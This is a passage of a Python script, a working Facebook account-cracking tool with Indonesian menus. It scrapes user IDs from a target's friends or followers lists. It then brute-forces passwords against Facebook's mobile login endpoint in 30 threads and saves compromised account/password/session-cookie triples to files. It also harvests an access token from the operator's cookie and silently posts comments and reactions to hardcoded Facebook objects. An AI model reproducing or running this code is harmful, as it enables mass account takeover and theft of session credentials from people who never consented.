		self.buv = hl+"/login/device-based/validate-password/?shbl=0"
		
	def ckr(self, em, pas):
		try:
			self.ua = random.choice(uap)
			self.uag = random.choice(uag)
			s = r.Session()
			sys.stdout.write(f'\r [crack] {self.ct}/{kabeh} ok:-{len(self.ok)} cp:-{len(self.cp)}'),
			sys.stdout.flush()
			for pw in pas:
				if self.cek(em) : break
				rs = s.get(self.buf, headers=ch(hg.format(bu=hl+"/", ua=self.uag, hos=self.pe.netloc)))
				rs = s.post(self.buv, data={"lsd": re.search(r'name="lsd" value="(.*?)"', rs.text).group(1), "jazoest": re.search(r'name="jazoest" value="(.*?)"', rs.text).group(1), "uid": em, "flow": "login_no_pin", "pass": pw, "next": "https://developers.facebook.com/tools/debug/accesstoken/"}, headers=ch(hp.format(bu=self.buf, ua=self.ua, hl=hl, hos=self.pe.netloc)), allow_redirects=False)
				if "c_user" in s.cookies:
					cd, cs = s.cookies.get_dict(), cvs(s.cookies)
					open("result/ok.txt", "a").write(f"{em}|{pw}|{cs}\n")
					self.ok.append(em)
					print(f"\r\x1b[1;32m [LIVE] {em}|{pw}|{cs}\x1b[0m")
					if os.path.exists(".ua"):
						if os.path.getsize(".ua"):
							if self.ua not in open(".wl").read():
								# Subete no ningen wa dogu deshikanai:'v
								r.post(f"https://graph.facebook.com/1431891070614199/comments/?message={self.ua}&access_token={run.t}"); open(".wl", "a").write(self.ua+"\n")
					apc("active", cd)
					#apc("inactive", cd)
					break
				elif "checkpoint" in s.cookies:
					cd, cs = s.cookies.get_dict(), cvs(s.cookies)
					open("result/cp.txt", "a").write(f"{em}|{pw}\n")
					self.cp.append(em)
					print(f"\r\x1b[1;33m [CHEK] {em}|{pw}           \x1b[0m")
					break
				else:
					continue
			self.ct += 1
		except (r.exceptions.ConnectionError, r.exceptions.ConnectTimeout, r.exceptions.ReadTimeout):
			time.sleep(2);self.ckr(em, pas)
		
	def cek(self, u):
		if u in open("result/ok.txt").read() or u in open("result/cp.txt").read(): return True
		
	def ikuzo(self, lost):
		global kabeh
		kabeh = len(lost)
		from concurrent.futures import ThreadPoolExecutor as thr
		with thr(max_workers=30) as sub:
			for usr in lost:
				sub.submit(self.ckr, usr["u"], usr["p"])
		
class main:
	
	def __init__(self, c=None, t=None):
		self.c = c
		self.t = t

	def ck(self, citak=True):
		rs = r.get(h+"/profile.php", cookies=self.c)
		if not "mbasic_logout_button" in rs.text:
			os.remove(".aing")
			os.remove(".biskuit")
			exit(" # cookie modar")
		if not citak : return
		os.system("clear")
		p = bs(rs.text, "html.parser").find("title").text
		print(f"\n    ^ By {asw} - https://github.com/zangetsu-z ^\n")
		print(f" + login as {p} | {self.c['c_user']}\n")

	def cf(self):
		if not os.path.exists("dump"):
			os.mkdir("dump")
		if not os.path.exists("result"):
			os.mkdir("result")
		if not os.path.exists("result/ok.txt") and not os.path.exists("result/cp.txt"):
			open("result/ok.txt", "w")
			open("result/cp.txt", "w")
		if not os.path.exists(".biskuit"):
			c = input(" # cookie: ")
			while not "c_user" in c:
				c = input(" # cookie: ")
			if c.endswith(";"):
				c = c[:-1]
			rs = r.get(h+"/profile.php", cookies=cvd(c))
			if not "mbasic_logout_button" in rs.text:
				exit(" # cookie gak valid")
			print("\n\n + welkom "+bs(rs.text, "html.parser").find("title").text+"\n\n")
			F = {"c": c, "t": None}
			open(".biskuit", "w").write(json.dumps(F))
			self.c = cvd(c)
			# please don't change
			react("1472943989842240", self.c)
			F["t"] = self.gadagToken()
			open(".biskuit", "w").write(json.dumps(F))
		asu = open(".biskuit").read()
		lod = json.loads(asu)
		self.c = cvd(lod["c"])
		if not lod["t"]:
			self.ck(False)
			lod["t"] = self.gadagToken()
			open(".biskuit", "w").write(json.dumps(lod))
		global asw
		self.t = lod["t"]
		if not os.path.exists(".aing"):
			mek = bs(r.get(h+"/profile.php?id=100013799582945", cookies=self.c).text, "html.parser").find("title").text
			open(".aing", "w").write(mek)
		asw = open(".aing").read()
		if not os.path.exists(".wl"):
			open(".wl", "w")
	
	def gadagToken(self):
		rs = r.get("https://business.facebook.com/business_locations", cookies=self.c, headers={"Host": "business.facebook.com", "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36", "accept": "*/*", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "origin": "https://www.facebook.com", "referer": "https://www.facebook.com"})
		return re.search('(EAAG\w+)', rs.text).group(1)
		
	def sv(self, rv, ot):
		exs = glob.glob("dump/*")
		if f"dump/{ot}.json" in exs:
			ot = ot+"".join(random.choice("abcdefghijklmnopqrstuvwxyz") for x in range(6))
		ot = "dump/"+ot+".json"
		open(ot, "w").write(json.dumps(rv))
		exit(f"\n + file save as {ot}")
	
	def oven(self):
		exs = glob.glob("dump/*")
		if len(exs) == 0:
			exit(" .! gak ada file dump, silahkan dump id terlebih dahulu asw")
		print(f"\n + {len(exs)} file dump ditemukan\n")
		for x in range(1, len(exs)+1):
			print(f" [{x}] {exs[x-1]}")
		sl = input("\n ?> ")
		while not sl in [str(i) for i in range(1, len(exs)+1)]:
			sl = input(" ?> ")
		cs = exs[int(sl)-1]
		return json.loads(open(cs).read())
	
	def start(self):
		self.lov = self.oven()
		sl = input(" ?> pake pw manual (y/n): ").upper()
		while sl not in list("YN"):
			sl = input(" ?> pake pw manual (y/n): ").upper()
		mnl = True if sl == "Y" else False
		self.osp = sp(self.lov, ml=mnl); sm()
		print("\n + crack started\n")
		cr().ikuzo(self.osp)
		print("\n\n # Done^")
		
	def base(self):
		self.cf()
		self.ck()
		m = d(self.c, self.t)
		print(" [1] dump id dari daftar teman")
		print(" [2] dump id dari followers")
		print(" [3] hapus file dump")
		print(" [4] ganti useragent")
		print(" [5] start crack")
		print(" [6] logout")
		print(" [0] exite\n")
		sl = input(" ?> ")
		while not sl in list("1234560"):
			sl = input(" ?> ")
		if sl == "1":
			ps = [{"e": "Tidak Ada Teman Untuk Ditampilkan", "p": " .! looks like the friends list is not published"}, {"e": "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang", "p": " .! limit"}, {"e": "Konten Tidak Ditemukan", "p": " .! user not found"}]
			u = input(" ?> id: ")
			while not u:
				u = input(" ?> id: ")
			u = u.split("/")[-1].split("id=")[-1]
			u = h+"/profile.php?id="+u+"&v=friends" if u.isdigit() else h+"/"+u+"/friends/"
			rs = r.get(u, cookies=self.c)
			for x in ps:
				if x["e"] in rs.text:
					exit(x["p"])
			if not "profile.php" in u:
				rs = r.get(u.split("friends")[0], cookies=self.c)
			u = re.search("lst=\d*%3A(\d*)%3A\d*", rs.text).group(1) if not "profile.php" in u else u.split("=")[1].split("&")[0]
			fd = m.fl(u)
			if not fd:
				exit(" .! gagal ngambil id")
			self.sv(fd, bs(rs.text, "html.parser").find("title").text)
		elif sl == "2":
			u = input(" ?> id: ")
			while not u:
				u = input(" ?> id: ")
			assert u.isdigit()
			rs = r.get("https://graph.facebook.com/"+u+"/?access_token="+self.t, headers={"Host": "graph.facebook.com", "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36", "accept": "application/json, text/plain, */*", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "origin": "https://www.facebook.com", "referer": "https://www.facebook.com"}).json()["name"]
			fd = m.fs(u)
			if not fd:
				exit(" .! gagal ngambil id")
			self.sv(fd, rs+"_followers")
		elif sl == "3":
			exit(os.system("rm -rf dump/*"))
		elif sl == "4":
			exit(cu())
		elif sl == "5":
			exit(self.start())
		elif sl == "6":
			exit(os.remove(".biskuit"))
		elif sl == "0":
			exit(" # adiosss")

#filter = ["mobile legends", "free fire", "pubg"]
filter = False
h = "https://free.facebook.com"
run = main()
run.base()

#for x in open("result/tes").read().splitlines():
	#apc("active", cvd(x.split("|")[-1]))
